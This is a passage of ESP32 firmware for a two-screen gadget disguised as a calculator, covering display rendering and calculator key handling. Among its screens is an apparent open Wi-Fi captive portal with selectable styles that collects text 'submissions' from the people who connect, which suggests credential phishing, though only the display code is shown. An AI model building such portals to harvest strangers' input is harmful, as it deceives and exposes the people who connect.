  d.drawFastHLine(0, 10, 128, WH);
  String title = fit(screenTitleB(), 21);
  if (title.length()) {
    d.fillRect(0, 11, 128, 10, WH); d.setTextColor(BK);
    d.setCursor(imax(0, 64 - tw(title, 1) / 2), 12); d.print(title); d.setTextColor(WH);
    d.drawFastHLine(0, 21, 128, WH);
  }
}

// ============================ DRAWING: DISPLAY A ============================
void drawIcon(int i, int cx, int cy) {
  Adafruit_SSD1306 &d = dA;
  if (i == 0) {                                   // gamepad
    d.drawRoundRect(cx - 15, cy - 7, 30, 16, 6, WH);
    d.drawFastHLine(cx - 11, cy + 1, 7, WH); d.drawFastVLine(cx - 8, cy - 2, 7, WH);
    d.fillCircle(cx + 7, cy - 1, 2, WH); d.fillCircle(cx + 11, cy + 3, 2, WH);
  } else if (i == 1) {                            // toolbox
    d.drawRoundRect(cx - 14, cy - 4, 28, 18, 3, WH); d.drawRoundRect(cx - 6, cy - 10, 12, 8, 2, WH);
    d.drawFastHLine(cx - 14, cy + 4, 28, WH); d.fillRect(cx - 3, cy + 2, 6, 5, WH);
  } else {                                        // gear
    d.drawCircle(cx, cy, 8, WH); d.fillCircle(cx, cy, 3, WH);
    for (int k = 0; k < 8; k++) {
      float a = k * PI / 4;
      d.drawLine(cx + (int)(cos(a) * 8), cy + (int)(sin(a) * 8), cx + (int)(cos(a) * 13), cy + (int)(sin(a) * 13), WH);
    }
  }
}
void drawMenuA() {
  static const char *N[3] = {"Games", "Tools", "Settings"};
  drawIcon(menuSel, 64, 20);
  txtC(dA, N[menuSel], 41, 2, 64);
  txtL(dA, "<", 6, 24, 1); txtL(dA, ">", 116, 24, 1);
  for (int i = 0; i < 3; i++) { int x = 64 + (i - 1) * 9; if (i == menuSel) dA.fillRect(x - 1, 60, 3, 3, WH); else dA.drawPixel(x, 61, WH); }
}
void drawListA() {
  Adafruit_SSD1306 &d = dA;
  headerA(lTitle);
  if (lN == 0) { txtC(d, "Empty", 34, 1, 64); return; }
  const int ROWS = 5, RH = 12, Y0 = 1;
  int top = iclamp(lSel - 2, 0, imax(0, lN - ROWS));
  d.setTextSize(1);
  for (int i = 0; i < ROWS && top + i < lN; i++) {
    int idx = top + i, y = Y0 + i * RH; bool s = (idx == lSel);
    uint16_t c = s ? BK : WH;
    if (s) d.fillRoundRect(1, y, 121, RH - 1, 2, WH);
    String rt = lRight[idx]; bool chev = lChev && rt.length() == 0;
    int rw = chev ? 6 : rt.length() * 6, xr = 118;
    if (lLock[idx]) { int lx = xr - rw - (rw ? 3 : 0) - 6; d.drawRect(lx + 1, y + 2, 4, 4, c); d.fillRect(lx, y + 5, 6, 5, c); rw += 9; }
    d.setTextColor(c); d.setCursor(6, y + 3); d.print(fit(lItem[idx], (xr - 6 - rw) / 6 - 1));
    if (chev) { d.setCursor(112, y + 3); d.print(">"); } else if (rt.length()) { d.setCursor(xr - rt.length() * 6, y + 3); d.print(rt); }
  }
  d.setTextColor(WH);
  if (lN > ROWS) {
    for (int y = 1; y < 64; y += 2) d.drawPixel(125, y, WH);
    int h = imax(6, 62 * ROWS / lN), pos = (62 - h) * top / (lN - ROWS);
    d.fillRect(124, 1 + pos, 3, h, WH);
  }
}

// ---- Calculator layout: turns the internal expression into positioned glyphs.
// Normal text is size 2 (12x16). Power slots are size 1 and raised to the top right
// of the number. Square roots get a radical sign and an overline.
#define CG_MAX   200
#define CALC_Y   30      // top of normal text
#define EXP_Y    24      // top of exponent text
#define ROOT_Y   21      // overline of a square root
struct CGlyph { char c; int16_t x, y; uint8_t sz; };
struct CSpan  { int16_t a, b; };
struct CSlot  { int16_t x, y; uint8_t w, h; };
struct CFrame { uint8_t type; int16_t sx; uint8_t cnt; };   // type 0 = power slot, 1 = square root
CGlyph cg[CG_MAX]; int cgN = 0;
CSpan  cRad[32];   int cRadN = 0;
CSlot  cSlot[32];  int cSlotN = 0;
int cTotal = 0, cCurX = 0, cCurY = 28, cCurH = 18;

void layoutCalc() {
  CFrame st[16]; int sp = 0, x = 0, n = expr.length();
  cgN = cRadN = cSlotN = 0;
  for (int i = 0; i <= n; i++) {
    bool small = (sp > 0 && st[sp - 1].type == 0);
    if (i == cursorPos) { cCurX = x; cCurY = small ? 23 : 28; cCurH = small ? 9 : 18; }
    if (i == n) break;
    char c = expr[i];
    if (c == '^' || c == 'Q') {
      if (sp < 16) { st[sp].type = (c == 'Q') ? 1 : 0; st[sp].sx = x; st[sp].cnt = 0; sp++; }
      x += (c == 'Q') ? 10 : 1;
    } else if (c == ']') {
      if (sp > 0) {
        CFrame f = st[--sp];
        if (f.cnt == 0) {                                   // empty slot -> dotted placeholder box
          if (cSlotN < 32) {
            CSlot &s = cSlot[cSlotN++];
            s.x = x + 1; s.y = f.type ? CALC_Y : EXP_Y; s.w = f.type ? 10 : 6; s.h = f.type ? 14 : 8;
          }
          x += f.type ? 12 : 8;
        }
        if (f.type) { if (cRadN < 32) { cRad[cRadN].a = f.sx; cRad[cRadN].b = x + 1; cRadN++; } x += 3; }
        else x += 1;
        if (sp > 0) st[sp - 1].cnt++;
      }
    } else {
      char one[2] = {c, 0};
      const char *s = (c == 'A') ? "Ans" : (c == 'P') ? "pi" : one;
      int sz = small ? 1 : 2, y = small ? EXP_Y : CALC_Y;
      for (const char *q = s; *q && cgN < CG_MAX; q++) {
        cg[cgN].c = *q; cg[cgN].x = x; cg[cgN].y = y; cg[cgN].sz = sz; cgN++;
        x += 6 * sz;
      }
      if (sp > 0) st[sp - 1].cnt++;
    }
  }
  cTotal = x;
}
void dotRect(Adafruit_SSD1306 &d, int x, int y, int w, int h) {
  for (int i = 0; i < w; i += 2) { d.drawPixel(x + i, y, WH); d.drawPixel(x + i, y + h - 1, WH); }
  for (int j = 0; j < h; j += 2) { d.drawPixel(x, y + j, WH); d.drawPixel(x + w - 1, y + j, WH); }
}
// Calculator: equation only (plus the SHIFT badge). The result is shown on display B.
void drawCalcA() {
  Adafruit_SSD1306 &d = dA; d.setTextColor(WH);
  layoutCalc();
  const int VL = 8, VW = 112;                       // visible window: screen x 8..120
  if (cCurX < scrollStart) scrollStart = imax(0, cCurX - 24);
  if (cCurX > scrollStart + VW - 2) scrollStart = cCurX - (VW - 2);
  if (scrollStart < 0) scrollStart = 0;
  int so = VL - scrollStart;                        // screen x = virtual x + so

  for (int i = 0; i < cgN; i++) {
    const CGlyph &g = cg[i];
    if (g.x < scrollStart || g.x + 6 * g.sz > scrollStart + VW) continue;
    d.setTextSize(g.sz); d.setCursor(g.x + so, g.y); d.write(g.c);
  }
  for (int i = 0; i < cRadN; i++) {                 // radical sign + overline
    int x0 = cRad[i].a, x1 = cRad[i].b;
    if (x0 >= scrollStart && x0 + 8 <= scrollStart + VW) {
      int sx = x0 + so;
      d.drawLine(sx, 38, sx + 2, 37, WH); d.drawLine(sx + 2, 37, sx + 5, 45, WH); d.drawLine(sx + 5, 45, sx + 8, ROOT_Y, WH);
    }
    int a = imax(x0 + 8, scrollStart), b = imin(x1, scrollStart + VW);
    if (a <= b) d.drawFastHLine(a + so, ROOT_Y, b - a + 1, WH);
  }
  for (int i = 0; i < cSlotN; i++) {                // empty slots
    const CSlot &s = cSlot[i];
    if (s.x >= scrollStart && s.x + s.w <= scrollStart + VW) dotRect(d, s.x + so, s.y, s.w, s.h);
  }
  if (((millis() / 500) & 1) == 0) {                // blinking cursor
    int cx = cCurX + so;
    if (cx >= VL - 1 && cx <= VL + VW) d.drawFastVLine(cx, cCurY, cCurH, WH);
  }
  if (scrollStart > 0) txtL(d, "<", 0, 34, 1);
  if (cTotal > scrollStart + VW) txtL(d, ">", 122, 34, 1);
  if (shiftOn) {
    d.fillRoundRect(1, 0, 34, 10, 2, WH); d.setTextColor(BK); d.setTextSize(1); d.setCursor(3, 1); d.print("Shift"); d.setTextColor(WH);
  }
  d.drawFastHLine(0, 10, 128, WH);
}
void drawTextA() {
  Adafruit_SSD1306 &d = dA; headerA(tTitle);
  d.drawRoundRect(2, 3, 124, 36, 4, WH);
  String s;
  if (tMask) { for (unsigned i = 0; i < tBuf.length(); i++) s += '*'; if (tBuf.length() && millis() - tLastChar < 800) s.setCharAt(s.length() - 1, tBuf[tBuf.length() - 1]); }
  else s = tBuf;
  String v = s.length() > 9 ? s.substring(s.length() - 9) : s;
  d.setTextSize(2); d.setCursor(7, 10); d.print(v);
  if (((millis() / 500) & 1) == 0 && v.length() < 9) d.fillRect(7 + v.length() * 12, 24, 10, 2, WH);
  txtL(d, String(tBuf.length()) + "/" + tMax, 4, 43, 1);
  txtR(d, tMask ? "hidden" : "visible", 124, 43, 1);
  if (pinTextPurpose()) txtC(d, "0-9 type  = enter", 56, 1, 64);
  else if (kbOpen) txtC(d, "typing on display B", 56, 1, 64);
  else txtC(d, "UP = open keyboard", 56, 1, 64);
}
void drawNoteViewA() {
  Adafruit_SSD1306 &d = dA; headerA(baseName(nvPath));
  d.setTextSize(1);
  for (int i = 0; i < 7 && nvTop + i < (int)nvLines.size(); i++) { d.setCursor(2, 2 + i * 8); d.print(nvLines[nvTop + i]); }
  int n = nvLines.size();
  if (n > 7) { for (int y = 1; y < 64; y += 2) d.drawPixel(125, y, WH); int h = imax(5, 62 * 7 / n); d.fillRect(124, 1 + (62 - h) * nvTop / (n - 7), 3, h, WH); }
}
void drawDcChatA() {
  Adafruit_SSD1306 &d = dA; headerA(dcDm[dcCur].name); d.setTextSize(1);
  int n = dcLines.size();
  if (n == 0) { txtC(d, "No messages", 34, 1, 64); return; }
  for (int i = 0; i < 8 && dcTop + i < n; i++) { d.setCursor(2, i * 8); d.print(dcLines[dcTop + i]); }
  if (n > 8) { for (int y = 1; y < 64; y += 2) d.drawPixel(125, y, WH); int h = imax(5, 62 * 8 / n); d.fillRect(124, 1 + (62 - h) * dcTop / (n - 8), 3, h, WH); }
}
void drawAiA() {
  Adafruit_SSD1306 &d = dA; headerA("AI"); d.setTextSize(1);
  if (aiLines.empty()) { txtC(d, "= ask", 34, 1, 64); return; }
  for (int i = 0; i < 8 && aiTop + i < (int)aiLines.size(); i++) {
    d.setCursor(2, i * 8); d.print(aiLines[aiTop + i]);
  }
  if (aiLines.size() > 8) {
    for (int y = 1; y < 64; y += 2) d.drawPixel(125, y, WH);
    int h = imax(5, 62 * 8 / aiLines.size());
    d.fillRect(124, 1 + (62 - h) * aiTop / (aiLines.size() - 8), 3, h, WH);
  }
}
void drawPortalA() {
  txtC(dA, "Open network", 7, 1, 64);
  txtC(dA, fit(portalSsid, 20), 22, 2, 64);
  txtC(dA, "http://192.168.1.1", 47, 1, 64);
}
void drawPortalSubmissionsA() {
  Adafruit_SSD1306 &d = dA;
  if (portalSubmissions.empty()) {
    txtC(d, "No submissions yet", 26, 1, 64);
    return;
  }
  d.setTextSize(1);
  for (int i = 0; i < 8 && portalTop + i < (int)portalLines.size(); i++) {
    d.setCursor(2, i * 8); d.print(portalLines[portalTop + i]);
  }
  if (portalLines.size() > 8) {
    for (int y = 1; y < 64; y += 2) d.drawPixel(125, y, WH);
    int h = imax(5, 62 * 8 / portalLines.size());
    d.fillRect(124, 1 + (62 - h) * portalTop / (portalLines.size() - 8), 3, h, WH);
  }
}
void drawClockA() {
  Adafruit_SSD1306 &d = dA; d.setTextColor(WH);
  if (!timeValid()) { txtC(d, timeStr(), 8, 4, 64); txtC(d, "Date not set", 46, 1, 64); txtC(d, "Press 1 to set it", 56, 1, 64); return; }
  struct tm t; localTm(t);
  txtC(d, pad2(t.tm_hour) + ":" + pad2(t.tm_min), 6, 4, 64);
  txtC(d, dateStr(), 44, 1, 64);
  if (timeApprox) txtC(d, "approximate - sync me", 54, 1, 64); else txtC(d, tzStr(tzOffset), 54, 1, 64);
  d.drawRect(0, 40, 128, 1, WH); d.fillRect(0, 40, (t.tm_sec * 128) / 60, 1, WH);
}
void fieldA(int x, int y, int w, const String &s, bool sel) {
  Adafruit_SSD1306 &d = dA;
  if (sel) { d.fillRoundRect(x - 2, y - 2, w + 4, 20, 3, WH); d.setTextColor(BK); } else d.setTextColor(WH);
  d.setTextSize(2); d.setCursor(x, y); d.print(s); d.setTextColor(WH);
}
void drawTimeSetA() {
  Adafruit_SSD1306 &d = dA; headerA("Set time");
  fieldA(4, 3, 48, String(tsF[0]), tsSel == 0); txtL(d, "-", 54, 3, 2);
  fieldA(64, 3, 24, pad2(tsF[1]), tsSel == 1); txtL(d, "-", 90, 3, 2);
  fieldA(100, 3, 24, pad2(tsF[2]), tsSel == 2);
  fieldA(4, 29, 24, pad2(tsF[3]), tsSel == 3); txtL(d, ":", 30, 29, 2);
  fieldA(40, 29, 24, pad2(tsF[4]), tsSel == 4);
  String z = tzStr(tsF[5] * 900); bool sel = tsSel == 5;
  if (sel) { d.fillRoundRect(70, 47, 56, 12, 3, WH); d.setTextColor(BK); }
  txtL(d, z, 72, 49, 1); d.setTextColor(WH);
}
void drawAboutA() {
  Adafruit_SSD1306 &d = dA; headerA("About");
  txtC(d, "TuffCalc", 3, 2, 64);
  txtC(d, String("v") + TUFF_VERSION, 25, 1, 64);
  txtC(d, "Heap " + String(ESP.getFreeHeap() / 1024) + "K", 37, 1, 64);
  txtC(d, "Flash " + fmtBytes(fsOk ? LittleFS.totalBytes() - LittleFS.usedBytes() : 0), 49, 1, 64);
  txtC(d, "made by @tomiszivacs", 56, 1, 64);
}
void drawOtaA() {
  Adafruit_SSD1306 &d = dA; headerA("OTA update");
  switch (otaState) {
    case OS_READY: txtC(d, "Ready for upload", 6, 1, 64); txtC(d, WiFi.localIP().toString(), 20, 1, 64); txtC(d, String(OTA_HOSTNAME) + ".local", 32, 1, 64); break;
    case OS_UP: case OS_DONE:
      txtC(d, otaState == OS_DONE ? "Done! Rebooting..." : "Uploading firmware", 8, 1, 64);
      d.drawRoundRect(8, 22, 112, 10, 3, WH); d.fillRect(10, 24, (108 * otaPct) / 100, 6, WH);
      txtC(d, String(otaPct) + "%", 38, 1, 64); break;
    case OS_ERR: txtC(d, "OTA error", 8, 1, 64); wrapDraw(d, otaMsg, 4, 22, 20, 3); break;
    default: break;
  }
  d.drawFastHLine(0, 49, 128, WH);
  txtC(d, String("Password: ") + (strlen(OTA_PASSWORD) ? OTA_PASSWORD : "none"), 54, 1, 64);
}
void drawEraseA() {
  headerA("Erase all data");
  if (eraseStage == 0) {
    wrapDraw(dA, "Deletes all notes, saved networks, high scores and settings.", 2, 2, 20, 3);
    txtC(dA, "= erase everything", 32, 1, 64);
    txtC(dA, "LEFT / MODE = cancel", 42, 1, 64);
  } else {
    txtC(dA, "Everything erased", 8, 1, 64);
    txtC(dA, "Press = to restart", 28, 1, 64);
  }
}
void drawToast() {
  Adafruit_SSD1306 &d = dA; int w = imin(124, tw(toastMsg, 1) + 14);
  d.fillRoundRect(64 - w / 2, 50, w, 13, 4, WH); d.setTextColor(BK); txtC(d, toastMsg, 53, 1, 64); d.setTextColor(WH);
}
void renderA() {
  dA.clearDisplay(); dA.setTextColor(WH); dA.setTextSize(1);
  switch (screen) {
    case S_CALC: drawCalcA(); break;
    case S_MENU: drawMenuA(); break;
    case S_GAMES: case S_TOOLS: case S_PORTAL_STYLE: case S_SETTINGS: case S_WIFI: case S_SCAN: case S_SAVED: case S_NOTES: case S_DCLIST: drawListA(); break;
    case S_TEXT: drawTextA(); break;
    case S_NOTEVIEW: drawNoteViewA(); break;
    case S_DCHAT: drawDcChatA(); break;
    case S_AI: drawAiA(); break;
    case S_PORTAL: drawPortalA(); break;
    case S_PORTAL_SUBMISSIONS: drawPortalSubmissionsA(); break;
    case S_CLOCK: drawClockA(); break;
    case S_TIMESET: drawTimeSetA(); break;
    case S_ABOUT: drawAboutA(); break;
    case S_OTA: drawOtaA(); break;
    case S_GAME: gameDrawA(); break;
    case S_ERASE: drawEraseA(); break;
    default: break;
  }
  if (toastUntil) drawToast();
  dA.display();
}

// ============================ DRAWING: DISPLAY B ============================
void drawKeyboardB() {
  Adafruit_SSD1306 &d = dB;
  for (int r = 0; r < 3; r++) for (int c = 0; c < 5; c++) {
    int x = c * 20, y = 22 + r * 10; char ch = kbCell(kbPage, kbWx + c, kbWy + r);
    bool fl = (kbFlash == r * 5 + c && millis() < kbFlashUntil);
    if (!ch) { d.drawPixel(x + 10, y + 6, WH); continue; }
    if (fl) { d.fillRoundRect(x + 1, y + 1, 18, 9, 2, WH); d.setTextColor(BK); } else { d.drawRoundRect(x + 1, y + 1, 18, 9, 2, WH); d.setTextColor(WH); }
    d.setCursor(x + 7, y + 1); d.print(ch);
  }
  d.setTextColor(WH);
  txtC(d, KB_NAMES[kbPage], 13, 1, 115);
  int rows = kbRows[kbPage];
  d.drawRect(102, 33, 24, rows * 2 + 2, WH);
  d.drawRect(103 + kbWx * 2, 34 + kbWy * 2, 10, 6, WH);
  for (int i = 0; i < 4; i++) { int x = 104 + i * 6; if (i == kbPage) d.fillRect(x, 50, 4, 4, WH); else d.drawRect(x, 50, 4, 4, WH); }
  drawHint("ALPHA=DEL SHIFT=SPACE");
}
void drawBodyB() {
  Adafruit_SSD1306 &d = dB; d.setTextColor(WH); d.setTextSize(1);
  switch (screen) {
    case S_CALC:                                   // result only
      if (resultStr.length()) {
        int n = resultStr.length(), sz = n <= 6 ? 3 : (n <= 10 ? 2 : 1);
        txtR(d, resultStr, 127, sz == 3 ? 25 : (sz == 2 ? 29 : 33), sz);
      }
      break;
    case S_MENU: {
      static const char *N[3] = {"Games", "Tools", "Settings"};
      txtC(d, N[menuSel], 27, 2, 64);
      drawHint(GL_LEFT GL_RIGHT " browse  = open");
      break;
    }
    case S_TEXT:
      if (kbOpen) { drawKeyboardB(); break; }
      if (pinTextPurpose()) {
        txtL(d, "0-9   enter digits", 0, 24, 1); txtL(d, "DEL   erase", 0, 32, 1);
        txtL(d, "=     confirm", 0, 40, 1); txtL(d, "MODE  cancel", 0, 48, 1);
      } else {
        txtL(d, "UP    open keyboard", 0, 24, 1); txtL(d, "=     confirm", 0, 32, 1);
        txtL(d, ".     show/hide", 0, 40, 1); txtL(d, "MODE  cancel", 0, 48, 1);
        drawHint("ALPHA=DEL SHIFT=SPACE");
      }
      break;
    case S_NOTES:
      txtL(d, "Join Wi-Fi (no pass):", 0, 24, 1); txtL(d, String(" ") + AP_SSID, 0, 32, 1);
      txtL(d, "Users " + String(WiFi.softAPgetStationNum()) + " Free " + fmtBytes(LittleFS.totalBytes() - LittleFS.usedBytes()), 0, 48, 1);
      drawHint(GL_UP GL_DOWN " browse = open " GL_LEFT " up");
      break;
    case S_NOTEVIEW:
      txtL(d, fmtBytes(nvSize) + ", " + String((unsigned)nvLines.size()) + " lines", 0, 24, 1);
      txtL(d, "Line " + String(nvTop + 1) + "/" + String((unsigned)nvLines.size()), 0, 34, 1);
      txtL(d, "Edit it in the browser", 0, 44, 1);
      drawHint(GL_UP GL_DOWN " scroll   " GL_LEFT " back");
      break;
    case S_DCLIST:
      if (lN > 0 && lSel >= 0 && lSel < dcN) {
        txtL(d, fit(dcDm[lSel].name, 21), 0, 24, 1);
        txtL(d, dcDm[lSel].username.length() ? fit(String("@") + dcDm[lSel].username, 21) : "Username unavailable", 0, 34, 1);
      } else {
        txtL(d, "No DM conversations", 0, 24, 1);
      }
      drawHint(GL_UP GL_DOWN " move  = open  " GL_LEFT " back");
      break;
    case S_DCHAT: {
      txtL(d, dcDm[dcCur].username.length() ? fit(String("@") + dcDm[dcCur].username, 21) : "Username unavailable", 0, 24, 1);
      txtL(d, "Line " + String(dcTop + 1) + "/" + String((unsigned)dcLines.size()), 0, 32, 1);
      uint32_t elapsed = millis() - dcLastPoll;
      uint32_t remaining = elapsed >= 20000 ? 0 : (20000 - elapsed + 999) / 1000;
      txtL(d, "Auto refresh " + String(remaining) + "s", 0, 40, 1);
      txtL(d, "1 = refresh", 0, 48, 1);
      drawHint(GL_UP GL_DOWN " scroll  = reply");
      break;
    }
    case S_AI:
      txtL(d, String("Lines ") + String(aiLines.size()), 0, 26, 1);
      drawHint(GL_UP GL_DOWN " scroll  = ask");
      break;
    case S_PORTAL:
      txtL(d, "Network " + fit(portalSsid, 15), 0, 26, 1);
      txtL(d, "Connected " + String(WiFi.softAPgetStationNum()), 0, 36, 1);
      txtL(d, "Submissions " + String(portalSubmissions.size()), 0, 46, 1);
      drawHint("MODE = stop and review");
      break;
    case S_PORTAL_SUBMISSIONS:
      if (portalSubmissions.empty()) {
        txtL(d, "No text received", 0, 28, 1);
        drawHint(GL_LEFT " back to Tools");
      } else {
        txtL(d, String(portalSubmissions.size()) + " total", 0, 30, 1);
        txtL(d, "Viewing " + String(portalSubmission + 1), 0, 40, 1);
        drawHint(GL_UP GL_DOWN " scroll  " GL_LEFT GL_RIGHT " entries");
      }
      break;
    case S_CLOCK:
      txtL(d, "Zone  " + tzStr(tzOffset), 0, 24, 1);
      txtL(d, String("Clock ") + (timeValid() ? (timeApprox ? "approximate" : "accurate") : "not set"), 0, 32, 1);
      txtL(d, String("Wi-Fi ") + (WiFi.status() == WL_CONNECTED ? "connected" : "off"), 0, 40, 1);
      txtL(d, "2 syncs zone + time", 0, 48, 1);
      drawHint("1=Set  2=Wi-Fi sync");
      break;
    case S_TIMESET: {
      static const char *FN[6] = {"Year", "Month", "Day", "Hour", "Minute", "UTC offset"};
      txtL(d, String("Editing: ") + FN[tsSel], 0, 24, 1);
      txtL(d, GL_UP GL_DOWN " change", 0, 34, 1); txtL(d, "0-9 type a value", 0, 42, 1);
      txtL(d, "Offset moves 15 min", 0, 48, 1);
      drawHint(GL_LEFT GL_RIGHT " field   = save");
      break;
    }
    case S_ABOUT:
      txtL(d, String("Chip ") + ESP.getChipModel(), 0, 24, 1);
      txtL(d, "CPU  " + String(ESP.getCpuFreqMHz()) + " MHz", 0, 32, 1);
      txtL(d, "Up   " + String(millis() / 60000) + " min", 0, 40, 1);
      txtL(d, "Dual SSD1306 OLED", 0, 48, 1);
      drawHint(GL_LEFT " back");
      break;
    case S_OTA:
      if (otaState == OS_ERR) { txtL(d, "Something went wrong", 0, 24, 1); wrapDraw(d, otaMsg, 0, 34, 21, 2); }
      else {
        txtL(d, "Wi-Fi " + fit(WiFi.SSID(), 15), 0, 24, 1); txtL(d, WiFi.localIP().toString(), 0, 32, 1);
        txtL(d, "Arduino IDE > Port >", 0, 40, 1); txtL(d, String("  ") + OTA_HOSTNAME + " (network)", 0, 48, 1);
      }
      drawHint(GL_LEFT " back  = retry");
      break;
    case S_ERASE:
      if (eraseStage == 0) { txtL(d, "This cannot be undone!", 0, 24, 1); txtL(d, "Press = to confirm.", 0, 36, 1); drawHint("= erase  " GL_LEFT " cancel"); }
      else { txtL(d, "Done. Restart needed.", 0, 24, 1); drawHint("= restart"); }
      break;
    case S_GAME: {
      if (curGame == 4) mcDrawB();
      else if (curGame == 3) { txtL(d, "YOU " + String(pSL) + " : " + String(pSR) + " CPU", 0, 26, 2); txtL(d, "Best wins " + String(best[3]), 0, 44, 1); }
      else {
        txtL(d, "SCORE", 0, 25, 1); txtL(d, String(gScore), 0, 34, 2);
        txtL(d, "BEST", 80, 25, 1); txtL(d, String(best[curGame]), 80, 34, 2);
        static const char *C[3] = {"Arrows steer", "<> move ^ rot v drop =slam", "UP = flap"};
        if (curGame == 1) txtL(d, "<> move ^rot v =drop", 0, 46, 1); else txtL(d, C[curGame == 2 ? 2 : 0], 0, 46, 1);
      }
      if (curGame != 4) drawHint("ALPHA pause MODE exit");
      break;
    }
    default: {
      if (screen == S_WIFI) {
        bool con = WiFi.status() == WL_CONNECTED;
        txtL(d, con ? "Connected" : "Not connected", 0, 24, 1);
        if (con) { txtL(d, fit(WiFi.SSID(), 21), 0, 32, 1); txtL(d, "IP " + WiFi.localIP().toString(), 0, 40, 1); txtL(d, "Signal " + String(sigPct(WiFi.RSSI())) + "%", 0, 48, 1); }
        else txtL(d, "Wi-Fi radio is off", 0, 32, 1);
      } else if (lN == 0) {
        wrapDraw(d, screen == S_SAVED ? String("No saved networks yet. Connect to one and it is saved automatically.") : String("Nothing here."), 0, 24, 21, 3);
      } else {
        d.setCursor(0, 24); d.print(fit(lItem[lSel], 21));
        if (lRight[lSel].length()) { d.setCursor(0, 36); d.print(fit(lRight[lSel], 21)); }
      }
      if (screen == S_SAVED) drawHint("= connect  DEL forget");
      else drawHint(GL_UP GL_DOWN " move  = OK  " GL_LEFT " back");
      break;
    }
  }
}
void renderB() {
  dB.clearDisplay(); dB.setTextColor(WH); dB.setTextSize(1);
  drawStatusBar(); drawBodyB();
  dB.display();
}

// ============================ SLEEP ============================
void goToSleep() {
  stopOTA(); notesStop(); portalStop(); WiFi.disconnect(true); WiFi.mode(WIFI_OFF);
  dB.clearDisplay(); dB.display();
  for (int w = 128; w >= 0; w -= 16) { dA.clearDisplay(); if (w > 0) dA.fillRect(64 - w / 2, 31, w, 2, WH); dA.display(); delay(15); }
  dA.clearDisplay(); dA.display(); dA.ssd1306_command(SSD1306_DISPLAYOFF); dB.ssd1306_command(SSD1306_DISPLAYOFF);
  delay(200);
  esp_sleep_disable_wakeup_source(ESP_SLEEP_WAKEUP_ALL);
  esp_deep_sleep_start();
}

// ============================ ERASE ============================
void doErase() {
  stopOTA(); notesStop(); portalStop();
  WiFi.disconnect(true); WiFi.mode(WIFI_OFF);
  erased = true;                 // stops anything from writing settings back
  LittleFS.format();
  prefs.clear();
  eraseStage = 1; dirtyA = dirtyB = true;
}

// ============================ KEY HANDLING ============================
void insertChar(char c) {
  if ((int)expr.length() >= MAX_EXPR_LEN) return;
  expr = expr.substring(0, cursorPos) + String(c) + expr.substring(cursorPos); cursorPos++;
}
void insertStr(const String &s, int caretOffset) {
  if ((int)expr.length() + (int)s.length() > MAX_EXPR_LEN) return;
  expr = expr.substring(0, cursorPos) + s + expr.substring(cursorPos); cursorPos += caretOffset;
}
// start of a new entry: after "=" a number starts fresh, an operator continues from Ans
void beginEntry(bool isOp) {
  if (justEvaluated) {
    if (isOp) { expr = "A"; cursorPos = 1; } else { expr = ""; cursorPos = 0; }
    justEvaluated = false;
  }
  resultStr = ""; hPos = 0;
}
void typeChar(char c) {
  beginEntry(c == '+' || c == '-' || c == 'x' || c == '/');
  insertChar(c);
}
// what is the cursor inside of? -1 = nothing, 0 = power slot, 1 = square root
int ctxAt(int pos, int *depth) {
  uint8_t st[24]; int sp = 0;
  for (int i = 0; i < pos && i < (int)expr.length(); i++) {
    char c = expr[i];
    if (c == '^') { if (sp < 24) st[sp++] = 0; }
    else if (c == 'Q') { if (sp < 24) st[sp++] = 1; }
    else if (c == ']') { if (sp) sp--; }
  }
  if (depth) *depth = sp;
  return sp ? st[sp - 1] : -1;
}
int findOpener(int closeIdx) {
  int depth = 0;
  for (int k = closeIdx - 1; k >= 0; k--) {
    char c = expr[k];
    if (c == ']') depth++;
    else if (c == '^' || c == 'Q') { if (depth == 0) return k; depth--; }
  }
  return -1;
}
void insertSqrt() {
  beginEntry(false);
  int dep = 0, cx = ctxAt(cursorPos, &dep);
  if (cx == 0 || dep >= 6 || (int)expr.length() + 2 > MAX_EXPR_LEN) { toast("Can't do that here"); return; }
  insertStr("Q]", 1);                                  // cursor lands inside the root
}
void insertPowerSlot() {                               // SHIFT + ANS: power of whatever is before the cursor
  beginEntry(true);
  int dep = 0, cx = ctxAt(cursorPos, &dep);
  char p = cursorPos > 0 ? expr[cursorPos - 1] : 0;
  bool ok = isdigit((unsigned char)p) || p == '.' || p == ')' || p == 'A' || p == 'P' || p == ']';
  if (cx == 0 || dep >= 6 || !ok || (int)expr.length() + 2 > MAX_EXPR_LEN) { toast("Nothing to raise"); return; }
  insertStr("^]", 1);
}
void insertPowerDigit(char d) {                        // SHIFT + digit: digit with a power slot at its top right
  beginEntry(false);
  int dep = 0, cx = ctxAt(cursorPos, &dep);
  if (cx == 0 || dep >= 6) { insertChar(d); return; }  // already in a power slot: plain digit
  if ((int)expr.length() + 3 > MAX_EXPR_LEN) return;
  insertChar(d);
  insertStr("^]", 1);
}
void calcDel() {
  justEvaluated = false; resultStr = "";
  if (cursorPos == 0) return;
  char p = expr[cursorPos - 1];
  if (p == ']') {
    int o = findOpener(cursorPos - 1);
    if (o >= 0 && o == cursorPos - 2) { expr.remove(o, 2); cursorPos = o; }   // empty slot: remove it
    else cursorPos--;                                                          // otherwise step into it
  } else if (p == '^' || p == 'Q') {
    if (cursorPos < (int)expr.length() && expr[cursorPos] == ']') { expr.remove(cursorPos - 1, 2); cursorPos--; }
    else cursorPos--;                                                          // has content: step out
  } else { expr.remove(cursorPos - 1, 1); cursorPos--; }
}
void calcKey(uint8_t k, bool sh) {
  switch (k) {
    case K_AC: expr = ""; cursorPos = 0; resultStr = ""; justEvaluated = false; hPos = 0; break;
    case K_DEL: calcDel(); break;
    case K_LEFT: justEvaluated = false; resultStr = ""; if (cursorPos > 0) cursorPos--; break;
    case K_RIGHT: justEvaluated = false; resultStr = ""; if (cursorPos < (int)expr.length()) cursorPos++; break;
    case K_UP: if (hN) { hPos = imin(hPos + 1, hN); expr = hist[hN - hPos]; cursorPos = expr.length(); resultStr = ""; justEvaluated = false; } break;
    case K_DOWN: if (hPos > 0) { hPos--; expr = hPos ? hist[hN - hPos] : String(""); cursorPos = expr.length(); resultStr = ""; justEvaluated = false; } break;
    case K_EXP: typeChar(sh ? 'P' : 'E'); break;
    case K_ANS: if (sh) insertPowerSlot(); else typeChar('A'); break;
    case '=': evaluate(); break;
    default:
      if (sh && k == 'x') typeChar('(');
      else if (sh && k == '-') typeChar(')');
      else if (sh && k == '/') insertSqrt();
      else if (sh && k >= '0' && k <= '9') insertPowerDigit((char)k);
      else typeChar((char)k);
      break;
  }
}
void goBack() {
  switch (screen) {
    case S_MENU: enter(S_CALC); break;
    case S_GAMES: case S_TOOLS: case S_SETTINGS: enter(S_MENU); break;
